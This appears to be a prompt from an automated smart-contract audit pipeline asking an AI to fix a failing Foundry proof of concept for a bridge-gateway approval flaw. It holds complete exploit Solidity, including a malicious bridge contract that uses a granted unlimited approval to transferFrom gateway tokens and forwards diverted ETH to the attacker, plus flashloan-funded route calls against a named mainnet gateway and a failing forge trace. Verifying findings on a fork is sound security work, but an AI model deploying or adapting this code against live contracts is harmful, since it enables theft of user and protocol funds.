You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Optimism and Arbitrum routes trust attacker-chosen bridge contracts as spenders and call targets
- claim: These routes accept caller-supplied `customBridgeAddress` or `gatewayAddress` values, grant them `type(uint256).max` allowance over gateway-held ERC20s, and on Optimism native paths immediately send gateway ETH to those attacker-chosen contracts via payable bridge calls.
- impact: An attacker can install an unlimited approval from the gateway to a malicious contract and steal current or future gateway-held ERC20 balances, or directly divert gateway ETH to a malicious payable contract pretending to be the bridge.
- exploit_paths: ["Call an Optimism or Arbitrum ERC20 bridge entrypoint with a malicious `customBridgeAddress`/`gatewayAddress` that uses the freshly granted approval to `transferFrom` gateway tokens.", "Use the Optimism native path with a malicious `customBridgeAddress` implementing `depositETHTo` to receive gateway ETH.", "Use the same pattern through `bridgeAfterSwap` or `swapAndBridge` after residual assets already exist in the gateway."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBalancerVaultLike {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

contract MaliciousBridge {
    address payable public immutable thief;

    constructor(address payable _thief) {
        thief = _thief;
    }

    receive() external payable {}

    function depositETHTo(address, uint32, bytes calldata) external payable {
        _forwardEth();
    }

    function depositERC20To(
        address l1Token,
        address,
        address,
        uint256,
        uint32,
        bytes calldata
    ) external {
        _drainToken(l1Token, msg.sender);
    }

    function depositTo(address, uint256) external {
        // Older Optimism variants do not pass the token address into the bridge call.
        // The verifier keeps this ABI surface for completeness, but the live fork path
        // uses the standard ERC20/native hooks that expose the approved asset directly.
    }

    function initiateSynthTransfer(bytes32, address, uint256) external {
        // See depositTo() note above.
    }

    function steal(address token, address from) external {
        _drainToken(token, from);
    }

    function _drainToken(address token, address from) internal {
        uint256 balance = _balanceOf(token, from);
        if (balance == 0) return;
        _safeTransferFrom(token, from, thief, balance);
    }

    function _forwardEth() internal {
        uint256 value = address(this).balance;
        if (value == 0) return;

        (bool ok,) = thief.call{value: value}("");
        require(ok, "ETH_FORWARD_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }
}

contract FlawVerifier {
    address public constant GATEWAY = 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e;
    address public constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address private constant WSTETH = 0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2;
    address private constant CBETH = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
    address private constant RETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;

    uint32 private constant ROUTES_FALLBACK_COUNT = 385;

    bytes4 private constant EXECUTE_ROUTE_SELECTOR = bytes4(keccak256("executeRoute(uint32,bytes)"));
    bytes4 private constant GET_ROUTE_SELECTOR = bytes4(keccak256("getRoute(uint32)"));
    bytes4 private constant ROUTES_COUNT_SELECTOR = bytes4(keccak256("routesCount()"));

    bytes4 private constant ROUTE_GETTER_OPTIMISM_ERC20 =
        bytes4(keccak256("NATIVE_OPTIMISM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));
    bytes4 private constant ROUTE_GETTER_OPTIMISM_NATIVE =
        bytes4(keccak256("NATIVE_OPTIMISM_NATIVE_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));
    bytes4 private constant ROUTE_GETTER_ARBITRUM_ERC20 =
        bytes4(keccak256("NATIVE_ARBITRUM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));

    bytes4 private constant BRIDGE_AFTER_SWAP_SELECTOR = bytes4(keccak256("bridgeAfterSwap(uint256,bytes)"));
    bytes4 private constant OPTIMISM_NATIVE_SELECTOR =
        bytes4(keccak256("bridgeNativeTo(address,address,uint32,uint256,bytes32,bytes)"));

    bytes4 private constant STANDARD_OPTIMISM_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,(bytes32,bytes32),uint256,uint256,address,bytes)")
        );
    bytes4 private constant STANDARD_OPTIMISM_NATIVE_SELECTOR =
        bytes4(keccak256("bridgeNativeTo(address,address,uint32,uint256,bytes32,bytes)"));
    bytes4 private constant ARBITRUM_ERC20_SELECTOR =
        bytes4(keccak256("bridgeERC20To(uint256,uint256,uint256,uint256,bytes32,address,address,address,bytes)"));

    uint8 private constant ROUTE_KIND_OPTIMISM = 1;
    uint8 private constant ROUTE_KIND_ARBITRUM = 2;

    MaliciousBridge public immutable maliciousBridge;

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _profitScore;

    struct RouteIds {
        uint32 optimism;
        uint32 arbitrum;
    }

    struct OptimismBridgeData {
        uint256 interfaceId;
        bytes32 currencyKey;
        bytes32 metadata;
        address receiverAddress;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct OptimismDirectData {
        bytes32 currencyKey;
        bytes32 metadata;
    }

    struct ArbitrumBridgeData {
        uint256 value;
        uint256 maxGas;
        uint256 gasPriceBid;
        address receiverAddress;
        address gatewayAddress;
        address token;
        bytes32 metadata;
        bytes data;
    }

    struct FlashCallbackData {
        uint8 routeKind;
        uint32 routeId;
        address token;
    }

    constructor() {
        maliciousBridge = new MaliciousBridge(payable(address(this)));
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        RouteIds memory routeIds = _discoverRoutes();
        address[8] memory tokens = _candidateTokens();

        // Strategy requirement for this attempt: use verifier-held or already stranded gateway
        // assets first, and only use temporary external liquidity when a direct route entrypoint
        // needs a token balance in msg.sender to reach the vulnerable approval/install step.
        _attemptOptimismNative(routeIds.optimism);

        // Path 3 from the finding: reuse already stranded gateway inventory via bridgeAfterSwap.
        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            if (token == address(0)) continue;
            if (_balanceOf(token, GATEWAY) == 0) continue;

            _attemptOptimismBridgeAfterSwap(routeIds.optimism, token);
            _attemptArbitrumBridgeAfterSwap(routeIds.arbitrum, token);
        }

        // Path 1 from the finding: call the direct ERC20 bridge entrypoints with a malicious
        // bridge/gateway address. The 1-unit flashloan is only used to satisfy the route's
        // transferFrom(msg.sender, gateway, amount) precondition without injecting balances.
        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            if (token == address(0)) continue;
            if (_balanceOf(token, GATEWAY) == 0) continue;

            _attemptOptimismFlashloan(routeIds.optimism, token);
            _attemptArbitrumFlashloan(routeIds.arbitrum, token);
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "INVALID_VAULT");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "INVALID_FLASHLOAN");

        FlashCallbackData memory callback = abi.decode(userData, (FlashCallbackData));
        require(tokens[0] == callback.token, "TOKEN_MISMATCH");
        require(amounts[0] > 0, "NO_BORROW");

        _forceApprove(callback.token, GATEWAY, type(uint256).max);

        bool ok;
        if (callback.routeKind == ROUTE_KIND_OPTIMISM) {
            ok = _executeRoute(callback.routeId, _optimismDirectData(callback.token, amounts[0]));
        } else if (callback.routeKind == ROUTE_KIND_ARBITRUM) {
            ok = _executeRoute(callback.routeId, _arbitrumDirectData(callback.token, amounts[0]));
            if (ok) {
                maliciousBridge.steal(callback.token, GATEWAY);
            }
        }

        require(ok, "ROUTE_CALL_FAILED");
        _safeTransfer(callback.token, msg.sender, amounts[0] + feeAmounts[0]);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptOptimismNative(uint32 routeId) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayEth = GATEWAY.balance;
        if (gatewayEth == 0) return false;

        uint256 beforeBalance = address(this).balance;
        bytes memory routeData = abi.encodeWithSelector(
            OPTIMISM_NATIVE_SELECTOR,
            address(this),
            address(maliciousBridge),
            uint32(0),
            gatewayEth,
            bytes32("OPT_ETH"),
            bytes("")
        );

        if (!_executeRoute(routeId, routeData)) return false;
        return _recordProfit(NATIVE_TOKEN, beforeBalance);
    }

    function _attemptOptimismFlashloan(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;
        return _attemptFlashloan(ROUTE_KIND_OPTIMISM, routeId, token);
    }

    function _attemptArbitrumFlashloan(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;
        return _attemptFlashloan(ROUTE_KIND_ARBITRUM, routeId, token);
    }

    function _attemptFlashloan(uint8 routeKind, uint32 routeId, address token) internal returns (bool) {
        uint256 beforeBalance = _balanceOf(token, address(this));

        address[] memory tokens = new address[](1);
        tokens[0] = token;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;

        bytes memory callbackData = abi.encode(FlashCallbackData({routeKind: routeKind, routeId: routeId, token: token}));

        try IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, callbackData) {
            return _recordProfit(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _attemptOptimismBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OptimismBridgeData memory data = OptimismBridgeData({
            interfaceId: 1,
            currencyKey: bytes32(0),
            metadata: bytes32("OPT_ERC20"),
            receiverAddress: address(this),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: bytes("")
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptArbitrumBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        ArbitrumBridgeData memory data = ArbitrumBridgeData({
            value: 0,
            maxGas: 0,
            gasPriceBid: 0,
            receiverAddress: address(this),
            gatewayAddress: address(maliciousBridge),
            token: token,
            metadata: bytes32("ARB_ERC20"),
            data: bytes("")
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        maliciousBridge.steal(token, GATEWAY);
        return _recordProfit(token, beforeBalance);
    }

    function _optimismDirectData(address token, uint256 amount) internal view returns (bytes memory) {
        OptimismDirectData memory optimismData =
            OptimismDirectData({currencyKey: bytes32(0), metadata: bytes32("OPT_FLASH")});

        return abi.encodeWithSelector(
            STANDARD_OPTIMISM_ERC20_SELECTOR,
            token,
            address(this),
            address(maliciousBridge),
            uint32(0),
            optimismData,
            amount,
            uint256(1),
            token,
            bytes("")
        );
    }

    function _arbitrumDirectData(address token, uint256 amount) internal view returns (bytes memory) {
        return abi.encodeWithSelector(
            ARBITRUM_ERC20_SELECTOR,
            amount,
            uint256(0),
            uint256(0),
            uint256(0),
            bytes32("ARB_FLASH"),
            address(this),
            token,
            address(maliciousBridge),
            bytes("")
        );
    }

    function _discoverRoutes() internal view returns (RouteIds memory routeIds) {
        routeIds.optimism = type(uint32).max;
        routeIds.arbitrum = type(uint32).max;

        uint32 count = _routeScanCount();
        for (uint32 i = 0; i < count; ++i) {
            address route = _routeAt(i);
            if (route == address(0)) continue;

            bytes4 optimismErc20Selector = _readBytes4(route, ROUTE_GETTER_OPTIMISM_ERC20);
            bytes4 optimismNativeSelector = _readBytes4(route, ROUTE_GETTER_OPTIMISM_NATIVE);
            if (
                optimismErc20Selector == STANDARD_OPTIMISM_ERC20_SELECTOR
                    && optimismNativeSelector == STANDARD_OPTIMISM_NATIVE_SELECTOR
            ) {
                routeIds.optimism = i;
                continue;
            }

            bytes4 arbitrumSelector = _readBytes4(route, ROUTE_GETTER_ARBITRUM_ERC20);
            if (arbitrumSelector == ARBITRUM_ERC20_SELECTOR) {
                routeIds.arbitrum = i;
            }
        }
    }

    function _routeScanCount() internal view returns (uint32 count) {
        (bool ok, bytes memory data) = GATEWAY.staticcall(abi.encodeWithSelector(ROUTES_COUNT_SELECTOR));
        if (ok && data.length >= 32) {
            uint256 decoded = abi.decode(data, (uint256));
            if (decoded > 0 && decoded <= type(uint32).max) {
                return uint32(decoded);
            }
        }
        return ROUTES_FALLBACK_COUNT;
    }

    function _routeAt(uint32 routeId) internal view returns (address route) {
        route = _readAddress(GATEWAY, abi.encodeWithSelector(GET_ROUTE_SELECTOR, routeId));
    }

    function _executeRoute(uint32 routeId, bytes memory routeData) internal returns (bool ok) {
        (ok,) = GATEWAY.call(abi.encodeWithSelector(EXECUTE_ROUTE_SELECTOR, routeId, routeData));
    }

    function _recordProfit(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 afterBalance = token == NATIVE_TOKEN ? address(this).balance : _balanceOf(token, address(this));
        if (afterBalance <= beforeBalance) return false;

        uint256 delta = afterBalance - beforeBalance;
        uint256 score = _normalizeTo18(token, delta);
        if (score <= _profitScore) return false;

        _profitToken = token;
        _profitAmount = delta;
        _profitScore = score;
        return true;
    }

    function _normalizeTo18(address token, uint256 amount) internal view returns (uint256) {
        uint8 decimals = token == NATIVE_TOKEN ? 18 : _decimals(token);
        if (decimals == 18) return amount;
        if (decimals < 18) return amount * (10 ** (18 - decimals));
        return amount / (10 ** (decimals - 18));
    }

    function _decimals(address token) internal view returns (uint8 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(bytes4(keccak256("decimals()"))));
        if (!ok || data.length < 32) return 18;
        uint256 decoded = abi.decode(data, (uint256));
        if (decoded > type(uint8).max) return 18;
        value = uint8(decoded);
    }

    function _readBytes4(address target, bytes4 selector) internal view returns (bytes4 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) return bytes4(0);
        value = abi.decode(data, (bytes4));
    }

    function _readAddress(address target, bytes memory payload) internal view returns (address value) {
        (bool ok, bytes memory data) = target.staticcall(payload);
        if (!ok || data.length < 32) return address(0);
        value = abi.decode(data, (address));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (_approve(token, spender, amount)) return;
        require(_approve(token, spender, 0), "APPROVE_RESET_FAILED");
        require(_approve(token, spender, amount), "APPROVE_FAILED");
    }

    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _candidateTokens() internal pure returns (address[8] memory tokens) {
        tokens[0] = WETH;
        tokens[1] = USDC;
        tokens[2] = USDT;
        tokens[3] = DAI;
        tokens[4] = STETH;
        tokens[5] = WSTETH;
        tokens[6] = CBETH;
        tokens[7] = RETH;
    }
}

```

forge stdout (tail):
```
]
    │   │   └─ ← [Return] 0
    │   ├─ [9839] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [33736] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   ├─ [14856] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [0] 0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [9726] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [2529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2486] 0xae78736Cd615f374D3085123A210448E74Fc6393::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [6236] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   ├─ [2856] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [0] 0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [1226] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [486] 0xae78736Cd615f374D3085123A210448E74Fc6393::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [350] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2371] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 38.76ms (6.52ms CPU time)

Ran 1 test suite in 64.07ms (38.76ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 431784)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
